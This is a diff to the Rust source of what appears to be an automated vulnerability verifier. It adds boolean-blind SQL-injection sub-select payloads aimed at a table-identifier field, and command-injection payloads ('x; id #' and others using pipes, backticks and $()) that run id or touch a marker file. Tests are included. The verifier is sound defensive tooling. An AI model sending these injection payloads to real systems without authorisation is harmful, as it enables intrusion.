@@ -709,7 +709,18 @@ fn place_sql(probe: &Probe, value: &str, body_fields: &[String], sentinel: &str)
             target = format!("{target}{sep}{}={}", encode(name), encode(value));
         }
         Entry::Body(name) => {
-            let field = name.clone().unwrap_or_else(|| "id".to_owned());
+            // A whole-body source (`req.body`) leaves the entry field unnamed; the table identifier the
+            // sink actually interpolates (`const { type } = req.body` -> `UPDATE ${type}`) is recovered
+            // from the SQL plan so the sub-select enters that field rather than a generic default.
+            let field = name
+                .clone()
+                .or_else(|| {
+                    probe
+                        .sql
+                        .as_ref()
+                        .and_then(|plan| plan.identifier_field.clone())
+                })
+                .unwrap_or_else(|| "id".to_owned());
             body_members.retain(|(key, _)| key != &field);
             body_members.insert(0, (field, value.to_owned()));
         }
@@ -734,6 +745,78 @@ fn place_sql(probe: &Probe, value: &str, body_fields: &[String], sentinel: &str)
         headers,
         signal: Signal::InResponse,
     }
+}
+
+/// A boolean-blind SQL-injection differential for a table-identifier injection whose result the
+/// handler never reflects: the injected value is in every leg a sub-select of identical shape, so all
+/// three reach `.prepare` past any syntax error. The legs differ only in the literal the sub-select
+/// aliases into its columns, which decides whether the fabricated row satisfies the handler's bound
+/// `WHERE ... = ?`. `truthy` makes the row match (the handler then takes its record-found branch);
+/// `falsy_a`/`falsy_b` make it miss with two independent literals. The injection is proved when the
+/// truthy response differs from both falsy responses while the two falsy responses agree (after the
+/// per-leg literals are normalized out): only genuine evaluation of the sub-select's boolean — never a
+/// bound parameter and never a plain identifier, which error identically — can make the observable
+/// flip on whether the fabricated row matched. The two agreeing falsy legs are the negative control,
+/// and rule out response nondeterminism unrelated to the injection.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct SqlBlindCase {
+    pub truthy: Attempt,
+    pub falsy_a: Attempt,
+    pub falsy_b: Attempt,
+    /// Per-leg literal tokens stripped from every response before the legs are compared, so legs that
+    /// differ only by their own injected literal compare equal.
+    pub volatile: Vec<String>,
+}
+
+/// The boolean-blind differential for a table-identifier injection (see [`SqlBlindCase`]), or `None`
+/// when the finding is not an identifier-position injection the planner mapped. Each leg sends a
+/// sub-select aliasing every referenced column to a single literal: `truthy` uses the same sentinel the
+/// request binds into the handler's filter fields, so the fabricated row satisfies `WHERE col = ?`;
+/// each falsy leg uses a distinct non-matching literal, so the row is filtered out. Nothing here is
+/// tied to a specific app — the sub-select shape and the bound sentinel are mined from the SQL plan.
+pub fn sql_blind_cases(probe: &Probe, canary: &Canary, nonce: u32) -> Option<SqlBlindCase> {
+    let plan = probe.sql.as_ref()?;
+    let bound = format!("jsssent{nonce}");
+    let miss_a = format!("jssmiss{nonce}a{}", canary.token);
+    let miss_b = format!("jssmiss{nonce}b{}", canary.token);
+    let build = |row: &str| {
+        let parts: Vec<String> = plan
+            .columns
+            .iter()
+            .map(|col| format!("'{row}' as {}", col.name))
+            .collect();
+        format!("(select {})", parts.join(", "))
+    };
+    Some(SqlBlindCase {
+        truthy: place_sql(probe, &build(&bound), &plan.body_fields, &bound),
+        falsy_a: place_sql(probe, &build(&miss_a), &plan.body_fields, &bound),
+        falsy_b: place_sql(probe, &build(&miss_b), &plan.body_fields, &bound),
+        volatile: vec![bound, miss_a, miss_b],
+    })
+}
+
+/// Whether a boolean-blind SQL differential reproduced: the truthy response differs from each falsy
+/// response while the two falsy responses agree, all compared after the per-leg literals are removed so
+/// legs that differ only by their own injected literal collapse to the same text. A handler that
+/// rejects every non-allowlisted identifier, or that never branches on whether the row was found,
+/// leaves the truthy and falsy responses equal and does not reproduce.
+pub fn sql_blind_reproduced(
+    truthy: &str,
+    falsy_a: &str,
+    falsy_b: &str,
+    volatile: &[String],
+) -> bool {
+    let strip = |text: &str| {
+        let mut out = text.to_owned();
+        for token in volatile {
+            out = out.replace(token, "");
+        }
+        out
+    };
+    let t = strip(truthy);
+    let fa = strip(falsy_a);
+    let fb = strip(falsy_b);
+    t != fa && t != fb && fa == fb
 }
 
 /// Three otherwise-identical NoSQL requests: one match-all operator and two independent
@@ -1041,22 +1124,39 @@ fn payloads(class: VulnClass, canary: &Canary, nonce: u32) -> Vec<(String, Signa
             out
         }
         VulnClass::CommandInjection => {
+            // Prefer a read-only proof whose stdout is visible in the application response. The
+            // trailing shell comment prevents arguments appended by the vulnerable command from
+            // being passed to `id`. Keep the file marker variants as a fallback for blind command
+            // injection, where successful execution produces no response body we can inspect.
+            let mut out = ["x; id #", "x| id #", "x\nid #"]
+                .into_iter()
+                .map(|value| {
+                    (
+                        value.to_owned(),
+                        Signal::ResponseContains("uid=".to_owned()),
+                    )
+                })
+                .collect::<Vec<_>>();
+
             // A benign write of the marker file, reached through the metacharacters a shell
-            // honors: separators, a pipe, a subshell, a newline.
+            // honors: separators, a pipe, a subshell, a newline. This happens only in the
+            // disposable verifier container and is required to prove blind command execution.
             let hit = canary.written_file(nonce);
             let w = format!("touch {hit}");
             let signal = Signal::FileWritten(hit);
-            [
-                format!("x; {w}"),
-                format!("x| {w}"),
-                format!("x`{w}`"),
-                format!("x$({w})"),
-                format!("x\n{w}"),
-                format!("$({w})"),
-            ]
-            .into_iter()
-            .map(|value| (value, signal.clone()))
-            .collect()
+            out.extend(
+                [
+                    format!("x; {w}"),
+                    format!("x| {w}"),
+                    format!("x`{w}`"),
+                    format!("x$({w})"),
+                    format!("x\n{w}"),
+                    format!("$({w})"),
+                ]
+                .into_iter()
+                .map(|value| (value, signal.clone())),
+            );
+            out
         }
         VulnClass::CodeInjection => {
             // JavaScript that writes the marker file if the value is evaluated or required as a
@@ -1689,7 +1789,7 @@ mod tests {
     }
 
     #[test]
-    fn a_command_injection_writes_the_marker_file() {
+    fn a_command_injection_prefers_id_and_falls_back_to_a_marker_file() {
         let canary = Canary::new("t".to_owned());
         let a = attempts(
             &probe(
@@ -1700,12 +1800,17 @@ mod tests {
             &canary,
             0,
         );
+        assert_eq!(a[0].target, "/run?host=x%3B%20id%20%23");
+        assert!(matches!(
+            &a[0].signal,
+            Signal::ResponseContains(expected) if expected == "uid="
+        ));
         assert!(
-            a.iter().all(
+            a.iter().any(
                 |x| matches!(&x.signal, Signal::FileWritten(f) if f == &canary.written_file(0))
             )
         );
-        assert!(a.len() >= 4);
+        assert!(a.len() >= 7);
     }
 
     #[test]
@@ -2096,6 +2201,7 @@ mod tests {
                 },
             ],
             body_fields: vec!["id".to_owned()],
+            identifier_field: None,
         });
 
         let case = sql_cases(&p, &canary, 7).expect("SQL plan produces a differential");
@@ -2108,6 +2214,82 @@ mod tests {
 
         assert!("response jssqliabc123z7".contains(&case.computed));
         assert!(!"control response".contains(&case.computed));
+    }
+
+    #[test]
+    fn sql_blind_cases_flip_only_on_the_bound_where_match() {
+        let canary = Canary::new("abc123".to_owned());
+        let mut p = probe(
+            VulnClass::SqlInjection,
+            "/api/local/tags/remove",
+            Entry::Body(None),
+        );
+        p.method = Method::Post;
+        p.sql = Some(SqlPlan {
+            columns: vec![
+                SqlColumn {
+                    name: "id".to_owned(),
+                    filter: true,
+                },
+                SqlColumn {
+                    name: "CustomTag".to_owned(),
+                    filter: true,
+                },
+            ],
+            body_fields: vec!["id".to_owned(), "type".to_owned()],
+            identifier_field: Some("type".to_owned()),
+        });
+
+        let case = sql_blind_cases(&p, &canary, 1).expect("blind plan produces a differential");
+        // Every leg is a sub-select entering the interpolated identifier field, with the bound sentinel
+        // in the handler's filter field, so all three reach the sink identically.
+        let truthy = case.truthy.body.as_deref().unwrap();
+        assert!(truthy.contains("\"type\":\"(select 'jsssent1' as id, 'jsssent1' as CustomTag)\""));
+        assert!(truthy.contains("\"id\":\"jsssent1\""));
+        // The truthy leg's row matches the bound filter; each falsy leg carries a distinct literal that
+        // cannot match it.
+        assert!(
+            case.falsy_a
+                .body
+                .as_deref()
+                .unwrap()
+                .contains(&case.volatile[1])
+        );
+        assert!(
+            case.falsy_b
+                .body
+                .as_deref()
+                .unwrap()
+                .contains(&case.volatile[2])
+        );
+        assert_ne!(case.volatile[1], case.volatile[2]);
+
+        // A record-found branch that flips the response while the two non-matching controls agree is a
+        // reproduction; after the per-leg literals are stripped the controls collapse to one text.
+        let found = "{\"error\":false,\"message\":\"Deleted successfully\"}";
+        let miss_a = format!(
+            "{{\"error\":true,\"message\":\"Invalid table: {}\"}}",
+            case.volatile[1]
+        );
+        let miss_b = format!(
+            "{{\"error\":true,\"message\":\"Invalid table: {}\"}}",
+            case.volatile[2]
+        );
+        assert!(sql_blind_reproduced(
+            found,
+            &miss_a,
+            &miss_b,
+            &case.volatile
+        ));
+        // A handler that rejects every identifier identically, or never branches on the row, does not
+        // reproduce.
+        assert!(!sql_blind_reproduced(
+            &miss_a,
+            &miss_a,
+            &miss_b,
+            &case.volatile
+        ));
+        assert!(!sql_blind_reproduced(found, found, &miss_b, &case.volatile));
     }
 
     #[test]
